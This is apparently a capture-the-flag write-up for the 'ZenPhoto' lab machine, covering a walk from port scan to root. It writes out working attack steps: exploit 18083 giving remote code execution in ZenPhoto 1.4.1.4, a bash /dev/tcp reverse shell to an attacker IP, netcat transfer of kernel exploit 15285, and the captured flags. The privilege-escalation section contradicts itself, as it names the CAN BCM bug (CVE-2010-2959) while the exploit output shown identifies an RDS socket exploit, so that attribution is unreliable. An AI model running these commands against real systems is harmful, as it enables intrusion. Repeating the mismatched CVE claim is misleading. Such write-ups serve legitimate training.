---
title: "ZenPhoto - Writeup"
linkTitle: "ZenPhoto"
weight: 9
featured: true
platform: "PG"
name: "ZenPhoto"
os: "Linux"
difficulty: "Medium"
release: "04 Jul 2026"
ip: "192.168.195.41"
# Drop a real avatar at static/img/pg/zenphoto.png and uncomment:
# avatar: "/img/pg/zenphoto.png"
tags: ["linux", "zenphoto", "cve-2011-4825", "kernel-exploit", "cve-2010-2959", "root-shell"]
description: "Medium Linux box. An old ZenPhoto install gives RCE through a known ajax handler bug, then a decade-old kernel version finishes the job with a local CAN BCM privilege escalation."
---

{{< htb name="ZenPhoto" os="Linux" difficulty="Medium" release="04 Jul 2026" ip="192.168.195.41" platform="PG" >}}

## Reconnaissance

```
(root㉿kali)# rustscan -a 192.168.195.41
```

```
Open 192.168.195.41:22
Open 192.168.195.41:23
Open 192.168.195.41:80
Open 192.168.195.41:3306
```

```
(root㉿kali)# nmap 192.168.195.41 -p22,23,80,3306 -sCV
```

```
22/tcp   open  ssh     OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
23/tcp   open  ipp     CUPS 1.4
|_http-title: 403 Forbidden
80/tcp   open  http    Apache httpd 2.2.14 ((Ubuntu))
3306/tcp open  mysql   MySQL (unauthorized)
```

Port 23 answering as CUPS instead of telnet is unusual, but nothing there leads anywhere. Port 80 is the real target, everything here (OpenSSH 5.3, Apache 2.2.14) is well over a decade old.

## Enumeration

```
(root㉿kali)# ffuf -u "http://192.168.195.41/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -c
```

```
index                   [Status: 200]
test                    [Status: 301]
server-status           [Status: 403]
```

`/test` is a photo gallery search page.

![ZenPhoto search page returning no results](/img/pg/zenphoto/01-search-page.png)

Viewing the page source reveals the exact application and version in an HTML comment at the bottom.

![Page source showing zenphoto version 1.4.1.4](/img/pg/zenphoto/02-zenphoto-version.png)

```
<!-- zenphoto version 1.4.1.4 [8157] (Official Build) -->
```

## Initial Foothold

**ZenPhoto 1.4.1.4** has a known unauthenticated RCE in its ajax folder-creation handler.

```
(root㉿kali)# searchsploit zenphoto
```

```
ZenPhoto 1.4.1.4 - 'ajax_create_folder.php' Remote Code Execution | php/webapps/18083.php
```

```
(root㉿kali)# searchsploit -m php/webapps/18083.php
(root㉿kali)# php 18083.php 192.168.195.41 /test/
```

```
zenphoto-shell# ls
```

```
class.auth.php  class.file.php  config.php  data.php
```

The exploit drops into a limited command interface. Upgrade it to a real shell.

```
zenphoto-shell# bash -c 'bash -i >& /dev/tcp/192.168.45.170/443 0>&1'
```

```
(root㉿kali)# rlwrap nc -lvnp 443
```

```
connect to [192.168.45.170] from (UNKNOWN) [192.168.195.41] 34221
bash: no job control in this shell
```

Grab the user flag and check the kernel while here.

```
bash-4.2$ cat /home/local.txt
bash-4.2$ uname -a
```

```
81zc***************************
Linux offsecsrv 2.6.32-21-generic #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010 i686 GNU/Linux
```

## Privilege Escalation

A 2010 Ubuntu kernel is its own vulnerability. A quick search on the exact build points straight at a known local privilege escalation.

![Search results identifying the CAN BCM local privilege escalation for this kernel](/img/pg/zenphoto/03-kernel-exploit-search.png)

**Linux Kernel < 2.6.36-rc1, 'CAN BCM' Local Privilege Escalation (CVE-2010-2959, exploit-db 15285)** matches this exact kernel line.

Transfer the exploit source over netcat rather than relying on wget, since nothing modern is guaranteed to exist on a box this old.

```
(root㉿kali)# nc -lnvp 4444 < 15285.c
```

```
bash-4.2$ nc 192.168.45.170 4444 > 15285.c
```

Compile on the target and run it.

```
www-data@offsecsrv:/tmp$ gcc 15285.c -o 15285 -D_GNU_SOURCE
www-data@offsecsrv:/tmp$ ./15285
```

```
[*] Linux kernel >= 2.6.30 RDS socket exploit
[*] by Dan Rosenberg
[*] Resolving kernel addresses...
 [+] Resolved commit_creds to 0xc016dcc0
 [+] Resolved prepare_kernel_cred to 0xc016e000
```

Root shell lands. Grab the flag.

```
cat /root/proof.txt
```

```
a310ce1d9d0d316583f2819ae7460618
```

## Lessons learned

- Read the page source, not just the rendered page. The exact ZenPhoto build was sitting in an HTML comment, and that single version number is what turned a generic CMS into a specific, working exploit.
- `uname -a` is worth running the moment any shell lands, even before deeper enumeration. A kernel this old is a vulnerability by itself, and checking it early can save time spent hunting for a userland privesc path that was never going to be there.
- Don't assume standard tools like `wget` or `curl` exist on an old or minimal box. Netcat file transfer works almost anywhere and is worth defaulting to when the target's toolset is unknown.
